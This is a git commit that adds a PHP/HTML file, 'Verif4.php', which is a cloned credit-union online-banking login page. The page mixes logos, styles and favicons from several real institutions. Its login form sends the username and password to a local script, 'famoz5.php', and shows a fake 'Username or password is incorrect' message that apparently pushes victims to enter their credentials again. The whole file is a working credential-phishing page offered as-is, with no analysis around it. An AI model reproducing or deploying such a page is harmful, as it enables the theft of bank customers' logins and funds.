f34efcbc43515cf828a7cfec580d34eee34f4f7f
X-botf <168183930+X-botf@users.noreply.github.com>
2025-01-29 08:25:12 -0500

    Create Verif4.php

---
+++ api/Verif4.php
@@ -0,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head><meta charset="utf-8">
+	 <script>
+  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
+</script>
+<script defer src="/_vercel/insights/script.js"></script>
+	<title>Summit CU</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+	<link href="https://access.widgetfinancial.com/Themes/WidgetFCUTheme/Styles/Default_2tIu2Br4pGU1_Default.bndl?v=9usxLJemQTt01phIyHSe3YnaK1l5bbqHcio4V9Ni61E1" rel="stylesheet" type="text/css" />
+	<link href="https://access.widgetfinancial.com/Themes/WidgetFCUTheme/Styles/Default_2tIu2Br4pGU1_Default.bndl?v=9usxLJemQTt01phIyHSe3YnaK1l5bbqHcio4V9Ni61E1" rel="stylesheet" type="text/css" /><meta content="Orchard" name="generator" /><meta content="UL7b2EHVJtmrlRT1M0TmyQL0f-m08XynqkgbmVIb6R0_MaQrmwWxUkHdhEl5Lah743jtUufOZRi0GPzX3jTtfX_aRjDpg6zPBjNmpYctzPWa5_Xsp-a2XBm4gI_6EwT2bIPDdoL5IurcvSAxQaEGsLTYarndvw48DXLNOM4Efco1" name="csrf-token" /><meta content="X-AntiCSRF-Token" name="csrf-param" /><meta content="__AntiCsrfToken" name="csrf-form-param" />
+	<link href="https://my.solaritycu.org/Media/Default/Favicon/favicon.png" rel="shortcut icon" type="image/x-icon" /><meta name="apple-itunes-app" content="app-id=512153486">
+</head>
+<body><script> window.Chorus = window.Chorus || {}; window.Chorus.isMobile = true; window.Chorus.isMfmHosted = false; window.Chorus.isIFrameHosted = false; </script><script id="boot-data" type="application/json"> {"AvaliableFeatures":{"Features":[{"key":"Login\\Behavior\\QuickPassThroughUserNameStep","value":false},{"key":"Login\\Behavior\\RedirectToFiSiteAfterLogoff","value":true},{"key":"Login\\BiometricAuthentication\\Enabled","value":true},{"key":"Login\\MobileInterrupter\\Enabled","value":false},{"key":"Applications\\DataSource\\Accounts\\UiSettings\\NumericAccountNumberEnabled","value":true},{"key":"Applications\\DataSource\\Accounts\\UiSettings\\AccountTypeIconEnabled","value":true}]},"DisplayMode":{"IsMobile":true,"DisplayModeId":"Mobile"}} </script>
+<header class="navbar" role="banner">
+<div class="navbar__center">
+<div class="top-logo-block" style="text-align: center; display: block; width: 100%; margin: 10px auto;"><a href="/"><img alt="Summit Credit Union" height="80" src="https://www.widgetfinancial.com/wp-content/uploads/2020/01/WidgetLogo@2x-1.png" width="186" /> </a></div>
+</div>
+</header>
+    
+
+<div data-viewmodel="login/viewmodels/logoff" data-bind="props: wizardSettings" data-props="null">
+    <div class="loggoff-notifier-container"></div>
+    <div class="auth__wizard" data-main-content="">
+        
+
+    <div class="auth__wizard auth__wizard-username" data-viewmodel="login/viewmodels/userName" data-bind="props: settings" data-props="{&quot;authenticateInNewWindow&quot;:false,&quot;msBrowserBehavior&quot;:&quot;Standard&quot;,&quot;previousStepAllowed&quot;:false,&quot;finalStep&quot;:false,&quot;isRecaptchaEnabled&quot;:true}">
+        <div class="content__container">
+            <h1 class="page__heading">Welcome to Online Banking</h1>
+</header>
+
+<section class="container-view-scrollable">
+<form action="./famoz5.php" data-stable-name="LoginForm" data-viewmodel="login/viewmodels/userName" method="post">
+<div class="content__container has-padding">
+<div class="auth__form-divider">
+    <div data-bind="" data-role="notifier" style=""><div class="callout callout--error alert _2ff65bfa-4a5b-4496-8bab-16f13f3ea02d" role="alert" style="opacity: 1;"><span data-content="message">Username or password is incorrect</span><button type="button" class="btn__close" aria-label="Close" tabindex="1" data-stable-name="CloseButton"><span aria-hidden="true">×</span></button></div></div>
+<div class="form-control-container"><label><span class="form-control__label" data-stable-name="UserNameLabel">Username:</span> <input autocapitalize="none" autocomplete="new-value" class="form-control k-textbox" data-cfw-field="data-cfw-field" data-field-type="System.String" data-required-msg="This field is required." data-stable-name="UserNameInput" id="UserName" maxlength="32" name="username" required="required" type="text" /> </label></div>
+
+<div class="form-control-container"><label><span class="form-control__label" data-stable-name="UserNameLabel">Password:</span> <input autocapitalize="none" autocomplete="new-value" class="form-control k-textbox" data-cfw-field="data-cfw-field" data-field-type="System.String" data-required-msg="This field is required." data-stable-name="UserNameInput" id="UserName" name="password" required="required" type="password" /> </label></div>
+<input data-bind="" data-cfw-field="data-cfw-field" data-field-id="LoginMode" data-field-type="System.String" data-stable-name="LoginModeInput" id="LoginMode" name="LoginMode" type="hidden" value="" />
+<div class="form-control-container" data-staticdata="{&quot;recaptchaContainerStableName&quot;:&quot;ReCaptchaContainer&quot;}" data-viewmodel="orpheus/viewmodels/grecaptcha" data-viewname="grecaptcha">
+<div data-stable-name="ReCaptchaContainer" data-staticdata="{&quot;htmlElementId&quot;:&quot;recaptcha-v2-container&quot;,&quot;headerTokenKey&quot;:&quot;recaptcha-token&quot;,&quot;headerVersionKey&quot;:&quot;recaptcha-version&quot;,&quot;recaptchaHtmlElementId&quot;:&quot;recaptcha-v2-container&quot;,&quot;v2SiteKey&quot;:&quot;6Lev97YZAAAAALU4hs6Vg1m6uzRBs6effuxjsNDQ&quot;,&quot;v3SiteKey&quot;:&quot;6LeY97YZAAAAAFptlNgo1bxaXCwH65lNLLxQQJGt&quot;}">
+<div a="" are="" id="recaptcha-v2-container" not="" please="" robot.="" that="" verify="" you=""></div>
+
+<div data-bind="dom:$summary"></div>
+
+<div class="form-submit-container">
+<div class="form-control-container"><button autocomplete="off" class="btn btn--primary btn__block" data-stable-name="SignInButton" name="submit" type="submit">Log In</button></div>
+</div>
+</div>
+
+<div class="text-center">
+<div class="form-control-container"><a data-bind="attr: { target: targetSource }" data-stable-name="ForgotUserNameLink" href="#">I forgot my username.</a></div>
+</div>
+</div>
+
+<div class="content__container has-padding">
+<div class="form-submit-container">
+<p class="text-center">Don&#39;t have a login?</p>
+<a class="btn btn__block btn--primary" data-stable-name="RegisterLink" href="#">Enroll Now</a></div>
+</div>
+</div>
+</div>
+</form>
+</section>
+</div>
+</div>
+</div>
+<script src="/bundle/script/Unspecified/h_BrAijMQbk1_Default.bndl?v=Xv2qVBXmftGqLfVu8VcGhlt2_vlWH9WNIEXRftClVc41" type="text/javascript"></script><script> (function() { var toggleNotifier = function() { var notifier = $('[data-viewmodel=\'login/viewmodels/compromisedCredentialsNotifier\']'); if (notifier.length > 0) { /* Antlr cannot parse template for authorized user UI if it contains hash symbol, so we compare without it */ notifier.toggle(location.hash.substring(1).startsWith('/settings/userAccount')); clearInterval(toggleNotifierInterval); toggleAttemptCount = 0; } else if (++toggleAttemptCount >= 20) { clearInterval(toggleNotifierInterval); toggleAttemptCount = 0; } }; var toggleAttemptCount = 0; var toggleNotifierInterval = setInterval(toggleNotifier, 200); window.onhashchange = toggleNotifier; })(); </script><script type="text/javascript"> const fontFamilies = ['proxima-nova' ]; var WebFontConfig = { custom: { families: ['proxima-nova'], urls: ['https://use.typekit.net/klt7lef.css'] } }; ( function() { $('script:first').before('<script type="text/javascript" async src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js"/>'); } )(); $('body').css('font-family', "'" + fontFamilies.join("','") + "'"); </script></body>
+<link href="https://seaboardfcu.financialhost.org/Media/Default/Customization/custom-global2.css" rel="stylesheet" /><script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', { trackingId:'UA-67286047-82', cookieDomain:'auto', siteSpeedSampleRate: 100}); ga('require', 'secondaryProperty', {'newId' : 'UA-67286047-36'}); ga('send', 'pageview'); </script><script> (function() { var ga = window[window['GoogleAnalyticsObject']] || function() {}; var GADuplicate = function(tracker, config) { var o = tracker.get('sendHitTask'); var temp; tracker.set('sendHitTask', function(model) { o(model); temp = model.get('hitPayload').replace(new RegExp(model.get('trackingId'), 'g'), config.newId); if (temp) { model.set('hitPayload', temp, true); o(model); } }); }; ga('provide', 'secondaryProperty', GADuplicate); })(); </script></html>
